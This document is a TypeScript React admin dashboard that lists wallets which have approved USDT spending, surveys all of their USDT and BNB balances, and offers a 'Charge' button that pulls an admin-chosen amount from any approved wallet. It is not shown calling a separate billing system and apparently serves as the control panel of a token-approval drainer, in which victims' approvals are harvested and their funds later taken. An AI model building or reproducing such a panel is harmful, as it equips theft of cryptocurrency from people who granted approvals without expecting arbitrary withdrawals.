'use client';

import { useState, useEffect, useCallback } from 'react';
import { Wallet, Shield, Coins, DollarSign, Loader, AlertCircle, CheckCircle, Users, CreditCard, Copy } from 'lucide-react';
import { web3Service } from '../lib/web3';
import { redisService, ApprovalRecord } from '../lib/redis';

export default function AdminDashboard() {
  const [isConnected, setIsConnected] = useState(false);
  const [isAdmin, setIsAdmin] = useState(false);
  const [account, setAccount] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  // const [isBSCMainnet, setIsBSCMainnet] = useState(false);
  const [adminBalances, setAdminBalances] = useState({
    usdtBalance: '0',
    bnbBalance: '0'
  });
  const [message, setMessage] = useState({ type: '', text: '' });

  // Copy to clipboard function
  const copyToClipboard = async (text: string) => {
    try {
      await navigator.clipboard.writeText(text);
      setMessage({ type: 'success', text: 'Address copied to clipboard!' });
    } catch (err) {
      // Fallback for older browsers
      const textArea = document.createElement('textarea');
      textArea.value = text;
      document.body.appendChild(textArea);
      textArea.select();
      document.execCommand('copy');
      document.body.removeChild(textArea);
      setMessage({ type: 'success', text: 'Address copied to clipboard!' });
    }
  };

  // Approved users state
  const [approvedUsers, setApprovedUsers] = useState<ApprovalRecord[]>([]);
  const [isLoadingUsers, setIsLoadingUsers] = useState(false);

  // Charge modal state
  const [showChargeModal, setShowChargeModal] = useState(false);
  const [selectedUser, setSelectedUser] = useState<ApprovalRecord | null>(null);
  const [chargeAmount, setChargeAmount] = useState('');
  const [isCharging, setIsCharging] = useState(false);

  // Balance modal state
  const [showBalanceModal, setShowBalanceModal] = useState(false);
  const [selectedUserForBalance, setSelectedUserForBalance] = useState<ApprovalRecord | null>(null);
  const [userBalances, setUserBalances] = useState({ usdtBalance: '0', bnbBalance: '0' });
  const [isLoadingBalance, setIsLoadingBalance] = useState(false);

  // All users balances state
  const [allUsersBalances, setAllUsersBalances] = useState<Record<string, { usdtBalance: string; bnbBalance: string }>>({});
  const [isCheckingAllBalances, setIsCheckingAllBalances] = useState(false);

  const checkAdminStatus = useCallback(async () => {
    if (!web3Service.account) return;
    
    try {
      const adminStatus = await web3Service.isAdmin(web3Service.account);
      setIsAdmin(adminStatus);
      
      if (adminStatus) {
        await loadAdminBalances();
      }
    } catch (error) {
      console.error('Error checking admin status:', error);
      setIsAdmin(false);
    }
  }, []);

  useEffect(() => {
    // Check if already connected
    if (web3Service.account) {
      setIsConnected(true);
      setAccount(web3Service.account);
      // setIsBSCMainnet(web3Service.chainId === 56);
      checkAdminStatus();
    }
  }, [checkAdminStatus]);

  useEffect(() => {
    if (isAdmin) {
      loadApprovedUsers();
      loadAdminBalances();
    }
  }, [isAdmin]);

  // Auto-hide message notifications after 5 seconds
  useEffect(() => {
    if (message.text) {
      const timer = setTimeout(() => {
        setMessage({ type: '', text: '' });
      }, 5000);

      return () => clearTimeout(timer);
    }
  }, [message.text]);

  // Auto-hide error notifications after 5 seconds
  useEffect(() => {
    if (error) {
      const timer = setTimeout(() => {
        setError('');
      }, 5000);

      return () => clearTimeout(timer);
    }
  }, [error]);

  const connectWallet = async () => {
    setIsLoading(true);
    setError('');
    
    try {
      const result = await web3Service.connect();
      
      if (result.success) {
        setIsConnected(true);
        setAccount(result.account || '');
        // setIsBSCMainnet(result.chainId === 56);
        await checkAdminStatus();
      } else {
        setError(result.error || 'Unknown error');
      }
    } catch (error) {
      setError('Failed to connect wallet');
      console.error('Connection error:', error);
    } finally {
      setIsLoading(false);
    }
  };

  const loadAdminBalances = async () => {
    if (!web3Service.account) return;
    
    try {
      const balances = await web3Service.getAdminBalances();
      setAdminBalances({
        usdtBalance: balances.usdtBalance,
        bnbBalance: balances.bnbBalance
      });
    } catch (error) {
      console.error('Error loading admin balances:', error);
    }
  };

  const loadApprovedUsers = async () => {
    setIsLoadingUsers(true);
    try {
      const users = await redisService.getAllApprovals();
      // Filter only successful approvals
      const successfulUsers = users.filter(user => user.status === 'success');
      setApprovedUsers(successfulUsers);
      // Clear previous balances when users are reloaded
      setAllUsersBalances({});
    } catch (error) {
      console.error('Error loading approved users:', error);
      setError('Failed to load approved users');
    } finally {
      setIsLoadingUsers(false);
    }
  };

  const disconnectWallet = () => {
    web3Service.disconnect();
    setIsConnected(false);
    setAccount('');
    setIsAdmin(false);
    setAdminBalances({ usdtBalance: '0', bnbBalance: '0' });
    setApprovedUsers([]);
    setError('');
    setMessage({ type: '', text: '' });
  };

  const formatAddress = (address: string) => {
    return `${address.slice(0, 6)}...${address.slice(-4)}`;
  };

  const formatDate = (timestamp: number) => {
    return new Date(timestamp).toLocaleString();
  };

  const handleChargeUser = (user: ApprovalRecord) => {
    setSelectedUser(user);
    setChargeAmount('');
    setShowChargeModal(true);
  };

  const handleChargeSubmit = async () => {
    if (!selectedUser || !chargeAmount) return;
    
    setIsCharging(true);
    setError('');
    
    try {
      const amount = parseFloat(chargeAmount);
      if (amount <= 0) {
        setError('Charge amount must be greater than 0');
        return;
      }
      
      const result = await web3Service.chargeUSDT(selectedUser.walletAddress, chargeAmount);
      
      if (result.success) {
        setMessage({ type: 'success', text: `Successfully charged ${chargeAmount} USDT from user` });
        setShowChargeModal(false);
        setSelectedUser(null);
        setChargeAmount('');
        // Reload admin balances
        await loadAdminBalances();
      } else {
        setError(result.error || 'Failed to charge user');
      }
    } catch (error) {
      setError('An error occurred while charging the user');
      console.error('Charge error:', error);
    } finally {
      setIsCharging(false);
    }
  };

  const handleCheckBalance = async (user: ApprovalRecord) => {
    setSelectedUserForBalance(user);
    setShowBalanceModal(true);
    setIsLoadingBalance(true);
    setError('');
    
    try {
      const balances = await web3Service.getUserBalances(user.walletAddress);
      setUserBalances(balances);
      
      // Also update the all users balances state
      setAllUsersBalances(prev => ({
        ...prev,
        [user.walletAddress]: balances
      }));
    } catch (error) {
      setError('Failed to fetch user balances');
      console.error('Balance check error:', error);
    } finally {
      setIsLoadingBalance(false);
    }
  };

  const handleCheckAllBalances = async () => {
    setIsCheckingAllBalances(true);
    setError('');
    
    try {
      const newBalances: Record<string, { usdtBalance: string; bnbBalance: string }> = {};
      
      // Check balances for all users sequentially
      for (const user of approvedUsers) {
        try {
          const balances = await web3Service.getUserBalances(user.walletAddress);
          newBalances[user.walletAddress] = balances;
        } catch (error) {
          console.error(`Error fetching balance for ${user.walletAddress}:`, error);
          // Set default values for failed requests
          newBalances[user.walletAddress] = { usdtBalance: '0', bnbBalance: '0' };
        }
      }
      
      setAllUsersBalances(newBalances);
      setMessage({ type: 'success', text: `Successfully fetched balances for ${approvedUsers.length} users` });
    } catch (error) {
      setError('Failed to fetch all user balances');
      console.error('Check all balances error:', error);
    } finally {
      setIsCheckingAllBalances(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-blue-900 to-gray-900">
      {/* Header */}
      <header className="bg-black/50 backdrop-blur-sm border-b border-gray-800">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-16">
            <div className="flex items-center">
              <Shield className="h-8 w-8 text-yellow-400 mr-3" />
              <h1 className="text-xl font-bold text-white">Admin Dashboard</h1>
            </div>
            
            <div className="flex items-center space-x-4">
              {isConnected ? (
                <div className="flex items-center space-x-4">
                  <span className="text-white text-sm font-mono">
                    {formatAddress(account)}
                  </span>
                  <button
                    onClick={disconnectWallet}
                    className="px-4 py-2 bg-red-600 text-white font-medium rounded-lg hover:bg-red-700 transition-colors"
                  >
                    Disconnect
                  </button>
                  {isAdmin && (
                    <button
                      onClick={handleCheckAllBalances}
                      disabled={isCheckingAllBalances || approvedUsers.length === 0}
                      className="flex items-center space-x-2 px-4 py-2 bg-green-600 text-white font-medium rounded-lg hover:bg-green-700 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                    >
                      {isCheckingAllBalances ? (
                        <>
                          <Loader className="h-4 w-4 animate-spin" />
                          <span>Checking All...</span>
                        </>
                      ) : (
                        <>
                          <Coins className="h-4 w-4" />
                          <span>Check All Balances</span>
                        </>
                      )}
                    </button>
                  )}
                </div>
              ) : (
                <button
                  onClick={connectWallet}
                  disabled={isLoading}
                  className="flex items-center space-x-2 px-4 py-2 bg-yellow-400 text-black font-medium rounded-lg hover:bg-yellow-300 disabled:opacity-50 transition-colors"
                >
                  {isLoading ? (
                    <Loader className="h-4 w-4 animate-spin" />
                  ) : (
                    <Wallet className="h-4 w-4" />
                  )}
                  <span>{isLoading ? 'Connecting...' : 'Connect Wallet'}</span>
                </button>
              )}
            </div>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        {!isConnected ? (
          <div className="text-center py-12">
            <Wallet className="h-16 w-16 text-gray-400 mx-auto mb-4" />
            <h2 className="text-2xl font-bold text-white mb-2">Connect Your Wallet</h2>
            <p className="text-gray-400 mb-6">Please connect your wallet to access the admin dashboard</p>
            <button
              onClick={connectWallet}
              disabled={isLoading}
              className="flex items-center space-x-2 px-6 py-3 bg-yellow-400 text-black font-medium rounded-lg hover:bg-yellow-300 disabled:opacity-50 transition-colors mx-auto"
            >
              {isLoading ? (
                <Loader className="h-5 w-5 animate-spin" />
              ) : (
                <Wallet className="h-5 w-5" />
              )}
              <span>{isLoading ? 'Connecting...' : 'Connect Wallet'}</span>
            </button>
          </div>
        ) : !isAdmin ? (
          <div className="text-center py-12">
            <AlertCircle className="h-16 w-16 text-red-400 mx-auto mb-4" />
            <h2 className="text-2xl font-bold text-white mb-2">Access Denied</h2>
            <p className="text-gray-400">You are not authorized to access the admin dashboard</p>
          </div>
        ) : (
          <div className="space-y-8">
            {/* Status Cards */}
            <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
              <div className="bg-white/10 backdrop-blur-sm rounded-lg p-6 border border-white/20">
                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-gray-400 text-sm">Total Approved Users</p>
                    <p className="text-2xl font-bold text-white">{approvedUsers.length}</p>
                  </div>
                  <Users className="h-8 w-8 text-blue-400" />
                </div>
              </div>
              
              <div className="bg-white/10 backdrop-blur-sm rounded-lg p-6 border border-white/20">
                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-gray-400 text-sm">Admin USDT Balance</p>
                    <p className="text-2xl font-bold text-white">
                      {parseFloat(adminBalances.usdtBalance).toFixed(2)} USDT
                    </p>
                  </div>
                  <Coins className="h-8 w-8 text-green-400" />
                </div>
              </div>
              
              <div className="bg-white/10 backdrop-blur-sm rounded-lg p-6 border border-white/20">
                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-gray-400 text-sm">Admin BNB Balance</p>
                    <p className="text-2xl font-bold text-white">
                      {parseFloat(adminBalances.bnbBalance).toFixed(6)} BNB
                    </p>
                  </div>
                  <DollarSign className="h-8 w-8 text-yellow-400" />
                </div>
              </div>
            </div>

            {/* Approved Users Section */}
            <div className="bg-white/10 backdrop-blur-sm rounded-lg border border-white/20">
              <div className="p-6 border-b border-white/20">
                <h2 className="text-xl font-bold text-white flex items-center">
                  <Users className="h-5 w-5 mr-2" />
                  Approved Users
                </h2>
                <p className="text-gray-400 text-sm mt-1">Users who have approved USDT spending</p>
              </div>
              
              <div className="p-6">
                {isLoadingUsers ? (
                  <div className="text-center py-8">
                    <Loader className="h-8 w-8 animate-spin text-blue-400 mx-auto mb-4" />
                    <p className="text-gray-400">Loading approved users...</p>
                  </div>
                ) : approvedUsers.length === 0 ? (
                  <div className="text-center py-8">
                    <Users className="h-12 w-12 text-gray-400 mx-auto mb-4" />
                    <p className="text-gray-400">No approved users found</p>
                  </div>
                ) : (
                  <div className="overflow-x-auto">
                    <table className="w-full">
                      <thead>
                        <tr className="border-b border-white/20">
                          <th className="text-left py-3 px-4 text-gray-400 font-medium">Wallet Address</th>
                          <th className="text-left py-3 px-4 text-gray-400 font-medium">Approval Amount</th>
                          <th className="text-left py-3 px-4 text-gray-400 font-medium">Approval Date</th>
                          <th className="text-left py-3 px-4 text-gray-400 font-medium">Transaction Hash</th>
                          <th className="text-left py-3 px-4 text-gray-400 font-medium">USDT Balance</th>
                          <th className="text-left py-3 px-4 text-gray-400 font-medium">BNB Balance</th>
                          <th className="text-left py-3 px-4 text-gray-400 font-medium">Actions</th>
                        </tr>
                      </thead>
                      <tbody>
                        {approvedUsers.map((user, index) => (
                          <tr key={index} className="border-b border-white/10 hover:bg-white/5">
                            <td className="py-3 px-4 text-white font-mono">
                              <span
                                onClick={() => copyToClipboard(user.walletAddress)}
                                className="cursor-pointer hover:text-blue-300 transition-colors flex items-center space-x-2 group"
                                title="Click to copy full address"
                              >
                                <span>{formatAddress(user.walletAddress)}</span>
                                <Copy className="h-3 w-3 opacity-0 group-hover:opacity-100 transition-opacity text-blue-400" />
                              </span>
                            </td>
                            <td className="py-3 px-4 text-white">
                              {parseFloat(user.approvalAmount).toFixed(2)} USDT
                            </td>
                            <td className="py-3 px-4 text-gray-300">
                              {formatDate(user.timestamp)}
                            </td>
                            <td className="py-3 px-4 text-gray-300 font-mono text-sm">
                              {user.transactionHash ? 
                                `${user.transactionHash.slice(0, 10)}...${user.transactionHash.slice(-8)}` : 
                                'N/A'
                              }
                            </td>
                            <td className="py-3 px-4 text-white">
                              {allUsersBalances[user.walletAddress] ? (
                                <span className="text-green-400">
                                  {parseFloat(allUsersBalances[user.walletAddress].usdtBalance).toFixed(2)} USDT
                                </span>
                              ) : (
                                <span className="text-gray-400">-</span>
                              )}
                            </td>
                            <td className="py-3 px-4 text-white">
                              {allUsersBalances[user.walletAddress] ? (
                                <span className="text-yellow-400">
                                  {parseFloat(allUsersBalances[user.walletAddress].bnbBalance).toFixed(8)} BNB
                                </span>
                              ) : (
                                <span className="text-gray-400">-</span>
                              )}
                            </td>
                            <td className="py-3 px-4">
                              <div className="flex space-x-2">
                                <button
                                  onClick={() => handleChargeUser(user)}
                                  className="flex items-center space-x-2 px-3 py-1 bg-blue-600 text-white text-sm rounded hover:bg-blue-700 transition-colors"
                                >
                                  <CreditCard className="h-4 w-4" />
                                  <span>Charge</span>
                                </button>
                                <button
                                  onClick={() => handleCheckBalance(user)}
                                  disabled={isLoadingBalance && selectedUserForBalance?.walletAddress === user.walletAddress}
                                  className="flex items-center space-x-2 px-3 py-1 bg-green-600 text-white text-sm rounded hover:bg-green-700 transition-colors disabled:opacity-50"
                                >
                                  {isLoadingBalance && selectedUserForBalance?.walletAddress === user.walletAddress ? (
                                    <>
                                      <Loader className="h-4 w-4 animate-spin" />
                                      <span>Loading...</span>
                                    </>
                                  ) : (
                                    <>
                                      <Coins className="h-4 w-4" />
                                      <span>Balance</span>
                                    </>
                                  )}
                                </button>
                              </div>
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                )}
              </div>
            </div>

            
          </div>
        )}
      </main>

      {/* Error Message */}
      {error && (
        <div className="fixed top-4 right-4 z-50">
          <div className="bg-red-500 text-white px-6 py-4 rounded-lg shadow-xl border-l-4 border-red-700 max-w-sm">
            <div className="flex items-center justify-between">
              <div className="flex items-center">
                <AlertCircle className="h-5 w-5 mr-3" />
                <p className="text-sm">{error}</p>
              </div>
              <button
                onClick={() => setError('')}
                className="ml-4 text-white hover:text-red-200 transition-colors"
              >
                ×
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Success Message */}
      {message.text && (
        <div className="fixed top-4 right-4 z-50">
          <div className={`${message.type === 'success' ? 'bg-green-500' : 'bg-blue-500'} text-white px-6 py-4 rounded-lg shadow-xl border-l-4 ${message.type === 'success' ? 'border-green-700' : 'border-blue-700'} max-w-sm`}>
            <div className="flex items-center justify-between">
              <div className="flex items-center">
                <CheckCircle className="h-5 w-5 mr-3" />
                <p className="text-sm">{message.text}</p>
              </div>
              <button
                onClick={() => setMessage({ type: '', text: '' })}
                className="ml-4 text-white hover:opacity-80 transition-opacity"
              >
                ×
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Charge Modal */}
      {showChargeModal && selectedUser && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-white/10 backdrop-blur-lg rounded-2xl p-8 max-w-md w-full shadow-2xl border border-white/20">
            <h2 className="text-2xl font-bold text-white text-center mb-6">
              Charge User
            </h2>
            
            <div className="space-y-4 text-white">
              <div className="bg-white/10 rounded-lg p-4">
                <h3 className="font-semibold mb-2">User Address</h3>
                <p 
                  className="text-sm font-mono cursor-pointer hover:text-blue-300 transition-colors flex items-center space-x-2 group"
                  onClick={() => copyToClipboard(selectedUser.walletAddress)}
                  title="Click to copy full address"
                >
                  <span>{selectedUser.walletAddress}</span>
                  <Copy className="h-3 w-3 opacity-0 group-hover:opacity-100 transition-opacity text-blue-400" />
                </p>
              </div>
              
              <div className="bg-white/10 rounded-lg p-4">
                <h3 className="font-semibold mb-2">Approved Amount</h3>
                <p className="text-xl">{parseFloat(selectedUser.approvalAmount).toFixed(2)} USDT</p>
              </div>
              
              <div>
                <label className="block text-sm font-medium text-gray-300 mb-2">
                  Charge Amount (USDT)
                </label>
                <input
                  type="number"
                  value={chargeAmount}
                  onChange={(e) => setChargeAmount(e.target.value)}
                  className="w-full px-3 py-2 bg-white/10 border border-white/20 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500"
                  placeholder="0.00"
                  step="0.01"
                />
              </div>
            </div>
            
            <div className="flex space-x-4 mt-6">
              <button
                onClick={() => {
                  setShowChargeModal(false);
                  setSelectedUser(null);
                  setChargeAmount('');
                }}
                className="flex-1 bg-gray-600 text-white font-semibold py-3 px-6 rounded-lg transition-all duration-200 hover:bg-gray-700 focus:outline-none focus:ring-2 focus:ring-gray-400 focus:ring-opacity-50"
              >
                Cancel
              </button>
              <button
                onClick={handleChargeSubmit}
                disabled={isCharging || !chargeAmount || parseFloat(chargeAmount) <= 0}
                className="flex-1 bg-blue-600 text-white font-semibold py-3 px-6 rounded-lg transition-all duration-200 hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed focus:outline-none focus:ring-2 focus:ring-blue-400 focus:ring-opacity-50"
              >
                {isCharging ? (
                  <div className="flex items-center justify-center">
                    <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-2"></div>
                    Charging...
                  </div>
                ) : (
                  'Charge'
                )}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Balance Modal */}
      {showBalanceModal && selectedUserForBalance && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-white/10 backdrop-blur-lg rounded-2xl p-8 max-w-md w-full shadow-2xl border border-white/20">
            <h2 className="text-2xl font-bold text-white text-center mb-6">
              User Balances
            </h2>
            
            <div className="space-y-4 text-white">
              <div className="bg-white/10 rounded-lg p-4">
                <h3 className="font-semibold mb-2">User Address</h3>
                <p 
                  className="text-sm font-mono cursor-pointer hover:text-blue-300 transition-colors flex items-center space-x-2 group"
                  onClick={() => copyToClipboard(selectedUserForBalance.walletAddress)}
                  title="Click to copy full address"
                >
                  <span>{selectedUserForBalance.walletAddress}</span>
                  <Copy className="h-3 w-3 opacity-0 group-hover:opacity-100 transition-opacity text-blue-400" />
                </p>
              </div>
              
              {isLoadingBalance ? (
                <div className="text-center py-8">
                  <Loader className="h-8 w-8 animate-spin text-green-400 mx-auto mb-4" />
                  <p className="text-gray-300">Fetching balances from blockchain...</p>
                </div>
              ) : (
                <>
                  <div className="bg-white/10 rounded-lg p-4">
                    <h3 className="font-semibold mb-2">USDT Balance</h3>
                    <p className="text-xl text-green-400">
                      {parseFloat(userBalances.usdtBalance).toFixed(2)} USDT
                    </p>
                  </div>
                  
                  <div className="bg-white/10 rounded-lg p-4">
                    <h3 className="font-semibold mb-2">BNB Balance</h3>
                    <p className="text-xl text-yellow-400">
                      {parseFloat(userBalances.bnbBalance).toFixed(8)} BNB
                    </p>
                  </div>
                </>
              )}
            </div>
            
            <div className="flex justify-center mt-6">
              <button
                onClick={() => {
                  setShowBalanceModal(false);
                  setSelectedUserForBalance(null);
                  setUserBalances({ usdtBalance: '0', bnbBalance: '0' });
                }}
                className="bg-gray-600 text-white font-semibold py-3 px-8 rounded-lg transition-all duration-200 hover:bg-gray-700 focus:outline-none focus:ring-2 focus:ring-gray-400 focus:ring-opacity-50"
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
